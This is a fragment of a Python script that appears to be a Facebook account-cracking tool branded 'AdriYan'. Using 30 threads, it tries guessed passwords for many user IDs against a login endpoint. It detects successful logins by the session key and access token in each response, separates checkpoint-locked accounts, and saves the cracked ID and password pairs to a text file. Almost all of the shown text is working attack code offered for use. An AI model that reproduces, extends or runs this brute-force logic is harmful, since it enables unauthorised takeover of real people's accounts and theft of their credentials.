	...
	def old(self):
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				print("\n\033[1;32m [+] 𝐀𝐝𝐫𝐢𝐘𝐚𝐧 HAS BEEN START")
			...
			exit("\n\n \033[1;32m>>[PROCESS COMPLETE... \n\033[1;32m >>[THANKS FOR USING 𝐀𝐝𝐫𝐢𝐘𝐚𝐧 TOOL...")
	...
	def old2(self):
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				print("\n\033[0;97m [+] ADRIYAN HAS BEEN START")
...
"Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko",
		...
		sys.stdout.write(
			...
			"\r [+]>%s/[𝐀𝐝𝐫𝐢𝐘𝐚𝐧]>%s -> [OK]:-%s - [CP]:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r \033[1;32m[𝐀𝐝𝐫𝐢𝐘𝐚𝐧] %s | %s\033[0;32m         "%(uid, pw))

				print ("\r \033[1;32m Congrats ")

				self.ok.append("%s|%s"%(uid, pw))

				open("𝐀𝐝𝐫𝐢𝐘𝐚𝐧.txt","a").write(" %s|%s\n"%(uid, pw))

				break

			elif "www.facebook.com" in response.json()["error_msg"]:

				print("\r \033[1;32m[𝐀𝐝𝐫𝐢𝐘𝐚𝐧 %s | %s\033[1;32m         "%(uid, pw))
